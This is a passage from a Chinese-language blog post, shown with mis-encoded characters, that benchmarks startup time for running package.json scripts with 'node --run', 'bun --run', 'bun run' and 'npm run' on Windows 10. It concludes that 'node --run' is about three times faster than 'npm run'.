<p>çªç„¶æƒ³èµ· Node.js v22.0.0 æ”¯æŒ <code>node --run</code> è¿è¡Œè„šæœ¬ï¼Œä¸“ä¸ºæ€§èƒ½è€Œç”Ÿï¼Œçœ‹çœ‹å®ƒè¡¨ç°å¦‚ä½•ã€‚</p>
<h2 data-id="heading-11">ç¬¬å››è½®ï¼špackage.json è„šæœ¬ `--run` ç›´æ¥è¿è¡Œ</h2>
<p>å…ˆè§£é‡Šä¸‹ <code>node --run</code>ï¼Œæ˜¯çš„ï¼Œå®ƒä¹Ÿå¯ä»¥æ‰§è¡Œ package.json ä¸­çš„è„šæœ¬ï¼Œè€Œä¸”ç”Ÿæ¥å°±æ˜¯ä¸ºæ€§èƒ½è€ƒè™‘ï¼ˆä¸ä¼šæ‰§è¡Œ <code>pre</code> / <code>post</code> é’©å­ï¼‰ã€‚</p>
<blockquote>
<p>å®ƒå°†ä» <code>package.json</code> æ–‡ä»¶çš„ <code>"scripts"</code> å¯¹è±¡ä¸­è¿è¡ŒæŒ‡å®šçš„å‘½ä»¤ã€‚å¦‚æœæä¾›çš„ <code>"command"</code> ä¸å­˜åœ¨ï¼Œåˆ™ä¼šåˆ—å‡ºå¯ç”¨çš„è„šæœ¬ã€‚</p>
<p><code>node --run</code> å¹¶ä¸æ—¨åœ¨å®Œå…¨åŒ¹é… <code>npm run</code> æˆ–å…¶ä»–åŒ…ç®¡ç†å™¨çš„è¿è¡Œå‘½ä»¤çš„è¡Œä¸ºã€‚Node.js çš„å®ç°<strong>æœ‰æ„æ›´åŠ ç²¾ç®€</strong>ï¼Œä»¥ä¾¿åœ¨æœ€å¸¸è§çš„ç”¨ä¾‹ä¸­<strong>ä¸“æ³¨äºé¡¶çº§æ€§èƒ½</strong>ã€‚å…¶ä»–è¿è¡Œå®ç°ä¸­ä¸€äº›è¢«æœ‰æ„æ’é™¤çš„åŠŸèƒ½åŒ…æ‹¬ï¼š</p>
<ul>
<li>é™¤äº†è¿è¡ŒæŒ‡å®šçš„è„šæœ¬å¤–ï¼Œè¿˜ä¼šè¿è¡Œå‰ç½®ï¼ˆ<code>pre</code>ï¼‰æˆ–åç½®ï¼ˆ<code>post</code>ï¼‰è„šæœ¬ã€‚</li>
<li>å®šä¹‰ç‰¹å®šäºåŒ…ç®¡ç†å™¨çš„ç¯å¢ƒå˜é‡ã€‚</li>
</ul>
<p>â€”â€” <a href="https://link.juejin.cn?target=https%3A%2F%2Fnodejs.org%2Fdocs%2Flatest%2Fapi%2Fcli.html%23--run" target="_blank" title="https://nodejs.org/docs/latest/api/cli.html#--run" ref="nofollow noopener noreferrer">nodejs.org/docs/latestâ€¦</a></p>
</blockquote>
<h3 data-id="heading-12">node --run</h3>
<p><code>â¯ time node --run io</code>:</p>
<pre><code class="hljs language-ts" lang="ts">node --run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">79</span>% cpu <span class="hljs-number">0.216</span> total
node --run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>16s system <span class="hljs-number">81</span>% cpu <span class="hljs-number">0.192</span> total
node --run io  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>19s system <span class="hljs-number">84</span>% cpu <span class="hljs-number">0.220</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>216</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">216ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">216</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> å®Œç¾ ğŸ¤©</p>
<p><code>â¯ time node --run empty</code>:</p>
<pre><code class="hljs language-ts" lang="ts">node --run empty  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">89</span>% cpu <span class="hljs-number">0.192</span> total
node --run empty  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>16s system <span class="hljs-number">80</span>% cpu <span class="hljs-number">0.212</span> total
node --run empty  <span class="hljs-number">0.</span>00s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">89</span>% cpu <span class="hljs-number">0.192</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>192</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">192 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">192</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> å®Œç¾ ğŸ¤©ğŸ¤©</p>
<p><code>node --run</code> æ•´ä½“å¹³å‡ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>204</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">204 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">204</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ï¼Œç¡®å®åšäº†æ€§èƒ½ä¼˜åŒ–ï¼Œ<strong>ä¸‰å€æ€§èƒ½æå‡ ğŸš€</strong>ï¼š<code>npm run 616ms</code> VS <code>node --run 204ms</code></p>
<h3 data-id="heading-13">bun --run</h3>
<pre><code class="hljs language-ts" lang="ts">bun --run empty  <span class="hljs-number">0.</span>06s user <span class="hljs-number">0.</span>14s system <span class="hljs-number">53</span>% cpu <span class="hljs-number">0.370</span> total
bun --run empty  <span class="hljs-number">0.</span>05s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">75</span>% cpu <span class="hljs-number">0.347</span> total
bun --run empty  <span class="hljs-number">0.</span>04s user <span class="hljs-number">0.</span>21s system <span class="hljs-number">68</span>% cpu <span class="hljs-number">0.379</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>370</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">370 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">370</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<pre><code class="hljs language-ts" lang="ts">bun --run io  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>18s system <span class="hljs-number">61</span>% cpu <span class="hljs-number">0.324</span> total
bun --run io  <span class="hljs-number">0.</span>01s user <span class="hljs-number">0.</span>23s system <span class="hljs-number">73</span>% cpu <span class="hljs-number">0.334</span> total
bun --run io  <span class="hljs-number">0.</span>03s user <span class="hljs-number">0.</span>17s system <span class="hljs-number">52</span>% cpu <span class="hljs-number">0.382</span> total
</code></pre>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>334</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">334 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">334</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span> ï¼ˆio åè€Œé€Ÿåº¦å¿«äºç©ºè„šæœ¬ -_-||ï¼‰</p>
<p><code>bun --run</code> æ•´ä½“è€—æ—¶ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>352</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">352 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">352</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span>ï¼Œ<strong>åå¸¸ä¸‰ï¼š<code>bun --run</code> æ…¢äº <code>node --run</code></strong> çš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>204</mn><mi>m</mi><mi>s</mi></mrow><annotation encoding="application/x-tex">204 ms</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">204</span><span class="mord mathnormal">m</span><span class="mord mathnormal">s</span></span></span></span></span></p>
<h2 data-id="heading-14">æ€§èƒ½æ•°æ®æ€»ç»“</h2>
<p>æ–‡ç« ä»ä¸‰ä¸ªç»´åº¦ï¼ˆç›´æ¥å¯åŠ¨æ–‡ä»¶ã€è¿è¡Œ package.json è„šæœ¬ã€ä½¿ç”¨Â <code>--run</code>Â å‘½ä»¤ï¼‰å¯¹æ¯”äº† Node.js å’Œ Bun çš„æ€§èƒ½ã€‚</p>
<h3 data-id="heading-15">æ ¸å¿ƒç»“è®º</h3>
<ol>
<li><strong>ç›´æ¥å¯åŠ¨æ–‡ä»¶</strong>ï¼šæ— è®º TS or JSï¼ŒNode.js ä»¥æ˜¾è‘—ä¼˜åŠ¿èƒœå‡ºã€‚</li>
<li><strong>è¿è¡Œ package.json è„šæœ¬</strong>ï¼šBun (<code>bun run</code>) å‡»è´¥ npm (<code>npm run</code>)ï¼Œä½† <code>node --run</code>Â å‡­å€Ÿå…¶ç²¾ç®€è®¾è®¡å‡»è´¥ <code>bun run / npm run / bun --run</code>ã€‚</li>
</ol>
<p><strong/></p><p align="center"><strong>è‡³æ­¤æœ¬æ–‡é¢ è¦†äº†ä¸€ä¸ªä¼ ç»Ÿè§‚å¿µâ€œbun å¯åŠ¨ä¸€å®šæ¯” Node.js æ›´å¿«â€ã€‚</strong></p><p/>
<h4 data-id="heading-16">é™„å½•ï¼šè¯¦ç»†æ•°æ®</h4>
<h6 data-id="heading-17">è¡¨æ ¼ä¸€ï¼šç›´æ¥è¿è¡Œ JS/TS æ–‡ä»¶æ€§èƒ½å¯¹æ¯” (å•ä½ï¼šms)</h6>















































<table><thead><tr><th>æµ‹è¯•åœºæ™¯</th><th>Node.js (v22.18.0)</th><th>Bun (v1.3.2)</th><th><strong>æ€§èƒ½èƒœå‡ºæ–¹</strong></th></tr></thead><tbody><tr><td>å¯åŠ¨ç©º JS æ–‡ä»¶</td><td>~217</td><td>~371</td><td>Node.js (å¿« ~41%)</td></tr><tr><td>å¯åŠ¨å« IO çš„ JS æ–‡ä»¶</td><td>~234</td><td>~351</td><td>Node.js (å¿« ~33%)</td></tr><tr><td><strong>JS æ–‡ä»¶å¯åŠ¨ç»¼åˆè€—æ—¶</strong></td><td><strong>~225</strong></td><td>~361</td><td><strong>Node.js èƒœå‡º</strong></td></tr><tr><td>å¯åŠ¨ç©º TS æ–‡ä»¶</td><td>~240</td><td>~372</td><td>Node.js (å¿« ~35%)</td></tr><tr><td>å¯åŠ¨å« IO çš„ TS æ–‡ä»¶</td><td>~255</td><td>~405</td><td>Node.js (å¿« ~37%)</td></tr><tr><td><strong>TS æ–‡ä»¶å¯åŠ¨ç»¼åˆè€—æ—¶</strong></td><td><strong>~248</strong></td><td>~389</td><td><strong>Node.js èƒœå‡º</strong></td></tr></tbody></table>
<p><strong>ç»“è®ºä¸€ï¼š</strong> Â åœ¨ç›´æ¥å¯åŠ¨æ–‡ä»¶ï¼ˆæ— è®º JS æˆ– TSï¼‰çš„åœºæ™¯ä¸‹ï¼Œ<strong>Node.js ğŸš€ æ€§èƒ½æ˜¾è‘—ä¼˜äº Bun</strong>ï¼Œå¹³å‡é¢†å…ˆå¹…åº¦åœ¨ 35%-41% å·¦å³ã€‚è™½ç„¶æœ‰åç›´è§‰ä½†æ˜¯æˆ‘çš„ Windows ä¸‹ç¡®å®å¦‚æ­¤ã€‚</p>
<hr/>
<h5 data-id="heading-18">è¡¨æ ¼äºŒï¼šè¿è¡Œ package.json è„šæœ¬æ€§èƒ½å¯¹æ¯” (å•ä½ï¼šms)</h5>








































<table><thead><tr><th>æ‰§è¡Œæ–¹å¼</th><th>å¹³å‡è€—æ—¶ (å«IO)</th><th>å¹³å‡è€—æ—¶ (ç©ºè„šæœ¬)</th><th>ç»¼åˆå¹³å‡è€—æ—¶</th><th><strong>æ€§èƒ½æ’åº (ç”±å¿«åˆ°æ…¢)</strong></th></tr></thead><tbody><tr><td><strong><code>node --run</code></strong></td><td>~216 ms</td><td>~192 ms</td><td><strong>~204 ms</strong></td><td>ğŸ¥‡Â <strong>ç¬¬1å</strong></td></tr><tr><td><strong><code>bun run</code></strong></td><td>~313 ms</td><td>~361 ms</td><td>~337 ms</td><td>ğŸ¥ˆÂ <strong>ç¬¬2å</strong></td></tr><tr><td><strong><code>bun --run</code></strong></td><td>~334 ms</td><td>~370 ms</td><td>~352 ms</td><td>ğŸ¥‰Â <strong>ç¬¬3å</strong></td></tr><tr><td><strong><code>npm run</code></strong></td><td>~650 ms</td><td>~616 ms</td><td>~633 ms</td><td><strong>ç¬¬4å</strong></td></tr></tbody></table>
<p><strong>ç»“è®ºäºŒï¼š</strong></p>
<ol>
<li><strong><code>node --run</code>Â æ˜¯ç»å¯¹çš„æ€§èƒ½å† å†›</strong>ï¼Œé€Ÿåº¦æ˜¯Â <code>npm run</code>Â çš„Â <strong>3.1 å€</strong>ï¼Œä¹Ÿæ¯”Â <code>bun run</code>Â å¿«çº¦Â <strong>65%</strong> ã€‚</li>
<li>Bun ç›¸å…³å‘½ä»¤æ€§èƒ½æ¥è¿‘ï¼š<code>bun run</code>Â å’ŒÂ <code>bun --run</code>Â æ€§èƒ½åœ¨åŒä¸€æ°´å¹³ï¼Œéƒ½æ˜¾è‘—å¿«äºÂ <code>npm run</code>ï¼ˆå¿«çº¦ 88%ï¼‰ã€‚</li>
<li><strong><code>npm run</code>Â å«åº•</strong>ï¼šä¼ ç»Ÿ npm è„šæœ¬çš„å¯åŠ¨å¼€é”€æœ€å¤§ï¼Œè€—æ—¶æœ€é•¿ã€‚</li>
</ol>
<h2 data-id="heading-19">å¯¹æˆ‘ä»¬çš„å¯å‘</h2>
<ul>
<li><strong>Node.js vs. Bun å¯åŠ¨é€Ÿåº¦</strong>ï¼šåœ¨ç›´æ¥å¯åŠ¨Â <code>.js</code>Â æˆ–Â <code>.ts</code>Â æ–‡ä»¶æ—¶ï¼ŒNode.js æ¯” Bun å¿«çº¦Â <strong>40%-60%</strong> ã€‚è¿™æ˜¯â€œ<strong>ä¸€ä¸ªéå¸¸é‡è¦çš„ç»“è®º</strong>â€ã€‚</li>
<li><strong>Package Script è¿è¡Œé€Ÿåº¦</strong>ï¼š
<ul>
<li><code>bun run</code>Â æ¯”Â <code>npm run</code>Â å¿«çº¦Â <strong>2 å€</strong>ã€‚</li>
<li>è€Œé»‘é©¬ ğŸ <code>node --run</code>Â æ¯”Â <code>npm run</code>Â å¿«çº¦Â <strong>3 å€</strong>ï¼</li>
</ul>
</li>
</ul>
<p><strong><code>node --run</code>Â çš„æ„ä¹‰</strong>â€”â€”<strong>åŒ…è„šæœ¬è¿è¡Œçš„é©æ–°</strong>ï¼š<code>node --run</code>Â æ— ç–‘æ˜¯æœ¬æ¬¡æµ‹è¯•çš„æœ€å¤§äº®ç‚¹ï¼Œå…¶é€Ÿåº¦éå¸¸æ¥è¿‘ç›´æ¥è¿è¡ŒÂ <code>node foo.js</code>Â çš„é€Ÿåº¦ï¼Œå®ç°äº†è¿‘ä¹â€œè£¸å¥”â€çš„è„šæœ¬æ‰§è¡Œæ€§èƒ½ã€‚å®ƒé€šè¿‡<strong>ç‰ºç‰² npm è„šæœ¬çš„éƒ¨åˆ†é«˜çº§åŠŸèƒ½</strong>ï¼ˆå¦‚Â <code>pre</code>/<code>post</code>Â é’©å­ã€ç‰¹å®šçš„ç¯å¢ƒå˜é‡ï¼‰ï¼Œæ¢æ¥äº†Â  <strong>~3 å€äºÂ <code>npm run</code>Â çš„é€Ÿåº¦æå‡</strong>ï¼Œç”šè‡³è¶…è¶Šäº†ä»¥é€Ÿåº¦è§é•¿çš„Â <code>bun run</code>ã€‚å¯¹äºè¿½æ±‚æè‡´æ„å»ºã€æµ‹è¯•æˆ–å¯åŠ¨é€Ÿåº¦ï¼Œä¸”ä¸ä¾èµ–è¿™äº›é«˜çº§ç‰¹æ€§çš„é¡¹ç›®ï¼Œ<code>node --run</code>Â æä¾›äº†ä¸€ä¸ªè¿‘ä¹å®Œç¾çš„â€œæ€§èƒ½æ¨¡å¼â€ã€‚</p>
<p>å¯å‘ï¼šå¦‚æœä½ è¦ç›´æ¥æ‰§è¡Œæ–‡ä»¶è¯·ä½¿ç”¨ Node.jsï¼Œå¦‚æœè¦æ‰§è¡Œ npm script å»ºè®® 99% æƒ…å†µä¸‹ç”¨ <code>node --run</code>ï¼ˆæ— éœ€è¿è¡Œ <code>pre / post npm script</code> æ—¶ï¼‰å¦åˆ™ <code>bun run</code>ã€‚</p>
<h2 data-id="heading-20">è¯´æ˜</h2>
<p>æµ‹è¯•ç¯å¢ƒ Windows 10ã€git bashã€Node.js ğŸŸ¢ v22.18.0ã€npm v11.7.0ã€bun ğŸ v1.3.2ã€‚</p>
<hr/>
<p><em/></p><p align="center"><em>â€”â€” å®Œ ğŸ‰ æœ€æ–°æ–‡ç« è¯·å…³æ³¨å…¬ä¼—å· <strong><code>JavaScriptä¸ç¼–ç¨‹è‰ºæœ¯</code></strong> â€”â€”</em></p><p/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>